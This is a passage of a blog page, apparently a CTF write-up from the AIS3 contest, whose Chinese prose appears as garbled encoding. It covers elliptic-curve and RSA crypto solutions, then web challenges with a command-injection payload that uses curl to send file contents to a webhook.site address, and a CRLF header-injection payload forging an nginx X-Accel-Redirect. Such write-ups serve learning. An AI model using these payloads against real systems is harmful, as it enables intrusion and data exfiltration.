class="number">330613225413866308562655832653992432640737790102976283577689980446254238304479688134993945656361409867735093176372274589048066502491030816811279723518019832240148759433890104257541015694288688653084062998961288644429744942281764740765767448933787468732728303440425139427370295303413074746846731173227818565326124721081874768870022303341674817123171380954083010086565749443463586594318218908360567200188035652004143989131725183710453256926775457844063169319469</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(x**<span class="number">2</span>-x**<span class="number">3</span>-a*x==b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(y**<span class="number">2</span>-y**<span class="number">3</span>-a*y==b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.check()</span><br><span class="line">sat</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.model()</span><br><span class="line">[x, = <span class="number">796516347571618382842409566670391818297833481271542059034954968631944200751696685241692453026124019466008822177825139658601579493035399097176001286756611</span>,</span><br><span class="line"> y = <span class="number">359160846099444348290305694779134753321907709661985769865266028792407078112888527565129439985352509538424954784005539823019894001632619107445650921758147</span>]</span><br></pre></td></tr></table></figure>
<p>å¥½å•¦ï¼Œæœ‰på’Œqä¹‹å¾Œï¼Œå¯ä»¥ç®—å‡ºGä¸¦æ‹†orderåˆ†åˆ¥ç®—å®ƒå€‘çš„DLPï¼š<br>(ä»¥qç‚ºä¾‹ï¼Œpä¸€æ¨£)  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sage: a=-<span class="number">104951229064556148327739944704067225950771091414555823142245215914591450861058912834056552784840698307176425328594627265181382568207073595237991025400591036568504091217142152714020714029902656538299906438142893329711443629030712718260179304547062440636851281426983383018754523639374608995894644699923989</span></span><br><span class="line">sage: b=<span class="number">330613225413866308562655832653992432640737790102976283577689980446254383044796881349939456563614098677350931763722745890480665024910308168117972351801983224014875943389010425754101569428868865308406299896128864429744942281764740765767448933787468732728303440425139427370295303413074468467311732278185653261247210818747688700223033416748171231713809540831008656574944346358659431821890836056720018803565200414398913172518371053256926775457844063169319469</span></span><br><span class="line">sage: q=<span class="number">359160846099444348290305694779134753321907709661985769865266028792407078112888527565129439985352509538424954784005539823019894001632619107445650921758147</span></span><br><span class="line">sage: E = EllipticCurve(GF(q), [a, b])</span><br><span class="line">sage: G=E(<span class="number">28607748532586155305766590971512659203413099194155217832119487667929904063769085772752568246866731921408737399300889149334418551010959577073796486388937480663378183502384364325599822278159619696537650011902619010103876865119734678532259458237178383683768508566703123494722154129671015135020887186845060</span> , <span class="number">11556771936710627311327152614495265716197411903352782890022099742435127886458521280682189301147652900443377696183067981621473494668018204621652208514757</span>)</span><br><span class="line">sage: C=E(<span class="number">26711100496576685119729576632487291804536666301038622556968335217486889947153426038920564765985480495027226192426180920889404710714177330897458470987192539137847486749759239413620141196304823376881474287741080498376534259054440609508444858615416246577282166556054773489020913794668822330843444608421730</span>, <span class="number">12165040241593082803221196359814491555817137316163617470672182014503810780161804477407976153593724606514937006081912866361176466134156934782183659322121025579094922887583052870888825027604616070534178050563950169432924241914421544127099391730894894981983461145749926628000691771375822508363489298910865</span>)</span><br><span class="line">sage: factors, exponents = <span class="built_in">zip</span>(*factor(E.order()))</span><br><span class="line">....: primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))]</span><br><span class="line">....: dlogs = []</span><br><span class="line">....: <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">....:     t = <span class="built_in">int</span>(G.order()) // <span class="built_in">int</span>(fac)</span><br><span class="line">....:     dlog = discrete_log(t*C,t*G,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">....:     dlogs += [dlog]</span><br><span class="line">....:     <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">....:</span><br><span class="line">....: l = crt(dlogs,primes)</span><br><span class="line">....: <span class="built_in">print</span>(l)</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°på’Œqåˆ†åˆ¥çš„orderå¾Œå°±æ˜¯crtå»è¨ˆç®—å³å¯ï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sage: crt([lp, lq], [ordp, ordq])</span><br><span class="line"><span class="number">57366797191231613035327741961845991344248661489459273665787893494679511245498164076089068791122584458195315239399543984814150684970509045350166875864014581887869</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">57366797191231613035327741961845991344248661489459273665787893494679511245498164076089068791122584458195315239399543984814150684970509045350166875864014581887869</span>))</span><br><span class="line"><span class="comment">#AIS3&#123;3aSY_1Nte9eR_F4C7Or1zAt10N_4nD_@N_INtR0DucI70N_T0_MoV_aTt@CKs&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h4><p><strong>RSA.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, e, n</span>):</span><br><span class="line">    enc = <span class="built_in">pow</span>(bytes_to_long(m), e, n)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, d, n</span>):</span><br><span class="line">    dec = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(dec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">1024</span>)</span><br><span class="line">        q = getPrime(<span class="number">1024</span>)</span><br><span class="line">        n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        e = <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> phi % e != <span class="number">0</span> :</span><br><span class="line">            d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>, <span class="subst">&#123;e=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;FLAG: &quot;</span>, encrypt(FLAG, e, n))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Any message for me?&quot;</span>))</span><br><span class="line">            m = decrypt(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;How beautiful the message is, it makes me want to destroy it .w.&quot;</span>)</span><br><span class="line">            rah=bytes_to_long(os.urandom(<span class="number">8</span>))<span class="comment">#added my self</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;rah=&#125;</span>&quot;</span>)<span class="comment">#added my self</span></span><br><span class="line">            new_m = long_to_bytes(bytes_to_long(m) ^ rah)</span><br><span class="line">            <span class="built_in">print</span>( <span class="string">&quot;New Message: &quot;</span>, encrypt(new_m, e, n) )</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<p>Broadcast Attack<br>éå¸¸å¥½ç¬‘ï¼Œå› ç‚º<code>e</code>å¤ªå°æ‰€ä»¥XORçš„éƒ¨åˆ†æ ¹æœ¬ä¸ç”¨ç†æœƒï¼Œç›´æ¥ncä¸‰æ¬¡å¾ŒCRTå°±å¥½w<br>æˆ‘æœ¬ä¾†ä¸€ç›´å¡åœ¨xoråˆ°åº•è¦å¹¹å˜›ï¼Œç›´åˆ°æˆ‘åœ¨æ‰‹å‹•é€†å‘ä¸€å¨å™å¿ƒçš„æ‰£æ™‚æ‰æƒ³åˆ°æˆ‘å¯ä»¥åˆ†ä¸‰æ¬¡é€£ç„¶å¾Œå·è¨Šæ¯(  </p>
<p><img src="https://hackmd.io/_uploads/Hki1AAPua.png" alt="image"></p>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="DNS-Lookup-Tool-Final"><a href="#DNS-Lookup-Tool-Final" class="headerlink" title="DNS Lookup Tool: Final"></a>DNS Lookup Tool: Final</h4><p><strong>source code:</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>, <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;DNS Lookup Tool | Final&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;section <span class="class"><span class="keyword">class</span>=&quot;<span class="title">section</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">column</span> <span class="title">is</span>-6 <span class="title">is</span>-<span class="title">offset</span>-3 <span class="title">has</span>-<span class="title">text</span>-<span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">box</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">title</span>&quot;&gt;<span class="title">DNS</span> <span class="title">Lookup</span> <span class="title">Tool</span> ğŸ” | <span class="title">Final</span> <span class="title">Edition</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">example</span>.<span class="title">com</span>&quot; <span class="title">id</span>=&quot;<span class="title">hostname</span>&quot; <span class="title">value</span>=&quot;&lt;?= $<span class="title">_POST</span>[&#x27;<span class="title">name</span>&#x27;] ?? &#x27;&#x27; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">button</span> <span class="title">is</span>-<span class="title">block</span> <span class="title">is</span>-<span class="title">info</span> <span class="title">is</span>-<span class="title">fullwidth</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            <span class="title">Lookup</span>!</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">name</span>&#x27;])) : ?&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">section</span> <span class="title">class</span>=&quot;<span class="title">has</span>-<span class="title">text</span>-<span class="title">left</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">p</span>&gt;<span class="title">Lookup</span> <span class="title">result</span>:&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">b</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                            $<span class="title">blacklist</span> = [&#x27;|&#x27;, &#x27;&amp;&#x27;, &#x27;;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &quot;\<span class="title">n</span>&quot;, &#x27;<span class="title">flag</span>&#x27;, &#x27;*&#x27;, &#x27;?&#x27;];</span></span><br><span class="line"><span class="class">                            $<span class="title">is_input_safe</span> = <span class="title">true</span>;</span></span><br><span class="line"><span class="class">                            <span class="title">foreach</span> ($<span class="title">blacklist</span> <span class="title">as</span> $<span class="title">bad_word</span>)</span></span><br><span class="line"><span class="class">                                <span class="title">if</span> (<span class="title">strstr</span>($<span class="title">_POST</span>[&#x27;<span class="title">name</span>&#x27;], $<span class="title">bad_word</span>) !== <span class="title">false</span>) $<span class="title">is_input_safe</span> = <span class="title">false</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            <span class="title">if</span> ($<span class="title">is_input_safe</span>) </span>&#123;</span><br><span class="line">                                <span class="variable">$retcode</span> = <span class="number">0</span>;</span><br><span class="line">                                <span class="variable">$output</span> = [];</span><br><span class="line">                                <span class="title function_ invoke__">exec</span>(<span class="string">&quot;host <span class="subst">&#123;$_POST[&#x27;name&#x27;]&#125;</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$retcode</span>);</span><br><span class="line">                                <span class="keyword">if</span> (<span class="variable">$retcode</span> === <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;Host <span class="subst">&#123;$_POST[&#x27;name&#x27;]&#125;</span> is valid!\n&quot;</span>;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;Host <span class="subst">&#123;$_POST[&#x27;name&#x27;]&#125;</span> is invalid!\n&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;HACKER!!!&quot;</span>;</span><br><span class="line">                            <span class="meta">?&gt;</span></span><br><span class="line">                            &lt;/b&gt;</span><br><span class="line">                        &lt;/section&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;hr&gt;</span><br><span class="line">                    &lt;a href=<span class="string">&quot;/?source&quot;</span>&gt;Source Code&lt;/a&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/section&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€çœ¼å°±æ˜¯Command Injectionæ”»æ“Šã€‚<br>ä»”ç´°è§€å¯Ÿfilterï¼Œç™¼ç¾å®ƒæ²’æœ‰éæ¿¾ä»¥ä¸‹å››ç¨®å­—å…ƒ  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` $ ()</span><br></pre></td></tr></table></figure>
<p>æ–¼æ˜¯å°±å¯ä»¥ç”¨ä»–å€‘æ§‹é€ payloadï¼Œç¶²ç«™æ²’æœ‰è¼¸å‡ºcommandçµæœçš„è§£æ±ºæ–¹æ³•å°±æ˜¯webhook<br><strong>Payload</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`curl 	<span class="string">&#x27;https://webhook.site/df59d79f-07f6-49e3-899c-e8aa36a4bebe/&#x27;</span>$(find / -maxdepth 1 -size +10c -size -50c -<span class="built_in">type</span> f)`</span><br></pre></td></tr></table></figure>
<p>ã„Ÿâ€¦éæ¿¾äº†å­—ä¸²flagï¼Œé‚£å°±åœ¨ä¸­é–“å¡å¼•è™Ÿå§ :D  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`curl 	<span class="string">&#x27;https://webhook.site/df59d79f-07f6-49e3-899c-e8aa36a4bebe/&#x27;</span>$(<span class="built_in">cat</span> fl<span class="string">&#x27;&#x27;</span>ag_b2hKhYYVuLOKwi8j)`</span><br></pre></td></tr></table></figure>
<p><code>AIS3&#123;jUsT_3aSY_coMm4ND_InJ3c710N&#125;</code></p>
<h4 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h4><p><strong>app.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> ThreadingHTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">import</span> re, os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        FLAG = f.read().strip()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;this_is_a_fake_flag&#125;&quot;</span>)</span><br><span class="line">URL_REGEX = re.<span class="built_in">compile</span>(<span class="string">r&quot;https?://[a-zA-Z0-9.]+(/[a-zA-Z0-9./?#]*)?&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.path == <span class="string">&quot;/flag&quot;</span>:</span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(FLAG.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        query = parse_qs(urlparse(self.path).query)</span><br><span class="line">        redir = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redir&quot;</span> <span class="keyword">in</span> query:</span><br><span class="line">            redir = query[<span class="string">&quot;redir&quot;</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> URL_REGEX.<span class="keyword">match</span>(redir):</span><br><span class="line">                redir = <span class="literal">None</span></span><br><span class="line">        self.send_response(<span class="number">302</span> <span class="keyword">if</span> redir <span class="keyword">else</span> <span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> redir:</span><br><span class="line">            self.send_header(<span class="string">&quot;Location&quot;</span>, redir)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(<span class="string">b&quot;Hello world!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = ThreadingHTTPServer((<span class="string">&quot;&quot;</span>, <span class="number">7777</span>), RequestHandler)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting server, use &lt;Ctrl-C&gt; to stop&quot;</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
<p><strong>default.conf</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       7778;</span><br><span class="line">    listen  [::]:7778;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location /flag &#123;</span><br><span class="line">        internal;</span><br><span class="line">        proxy_pass http://web:7777;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://web:7777;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°±æ˜¯è¦å»è¨ªå•<code>/flag</code>çš„è·¯å¾‘ï¼Œç„¶è€Œå˜—è©¦ä¸€ä¸‹å°±æœƒåƒä¸Š404 requestï¼ŒåŸå› å°±å‡ºåœ¨default.confé™åˆ¶äº†åªæœ‰internalä½¿ç”¨è€…å¯ä»¥é€ è¨ªã€‚<br>ç„¶å¾Œæˆ‘å°±å¡åœ¨é€™å¾ˆä¹…äº†:Dã€‚<br>ç›´åˆ°æˆ‘æ³¨æ„åˆ°redirçš„GETåƒæ•¸æ˜¯ç›´æ¥æ›headerï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.send_header(<span class="string">&quot;Location&quot;</span>, redir)</span><br></pre></td></tr></table></figure>
<p>ã„Ÿï¼Œè¨˜å¾—åœ¨Port Swiggeræœ‰ç©éå¡<code>%0d%0a</code>æ›è¡Œå½é€ server side headeré€™æ‹›ã€‚<br>æ¸¬è©¦ä¸€ä¸‹ï¼Œç™¼ç¾å¯ä»¥ï¼š<br><strong>Payload:</strong>&#x2F;?redir&#x3D;<a href="https://example.com%0d%0aRAH:WHALE120">https://example.com%0d%0aRAH:WHALE120</a>  </p>
<p><img src="https://hackmd.io/_uploads/HJnn7yDd6.png" alt="è¢å¹•æ“·å–ç•«é¢ 2024-01-06 202614"><br>ä¸Šç¶²çˆ¬æ–‡ä¸€ä¸‹ç™¼ç¾äº†é€™å€‹nginx trick:<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/ctf-writeups/blob/master/midnightsun-ctf/bigspin.md">https://github.com/dreadlocked/ctf-writeups/blob/master/midnightsun-ctf/bigspin.md</a><br><code>X-Accel-Redirect: </code>çš„headeræœƒç›´æ¥è¢«è§£ææˆå¾å…§éƒ¨è¨ªå•å¾Œé¢æ¥çš„è·¯å¾‘ï¼Œå˜¿ï¼Œæ­é…å‰›å‰›çš„æ›è¡Œå¯ä»¥ç›´æ¥å½é€ å¾å…§éƒ¨è®€å–flagçš„å‡è±¡ã€‚<br><strong>Payload:</strong>&#x2F;?redir&#x3D;<a href="https://example.com%0d%0aX-Accel-Redirect:/flag">https://example.com%0d%0aX-Accel-Redirect:/flag</a>  </p>
<p><img src="https://hackmd.io/_uploads/BJjtVJvOT.png" alt="è¢å¹•æ“·å–ç•«é¢ 2024-01-06 202700">  </p>
<p>æˆåŠŸ!!!</p>
<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>è³½å¾Œçœ‹åˆ°å¤§å®¶é™¸çºŒå…¬å¸ƒè‡ªå·±è§£æ³•ï¼Œç™¼ç¾å¥½å¤šæ±è¥¿å…¶å¯¦è³½ä¸­æ‡‰è©²æƒ³åˆ°ï¼Œç­†è¨˜ç­†è¨˜www<br>æœŸå¾…æ±ºè³½ï¼ï¼ï¼  </p>
<p><img src="https://hackmd.io/_uploads/SyRE_kd_p.png" alt="image">  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
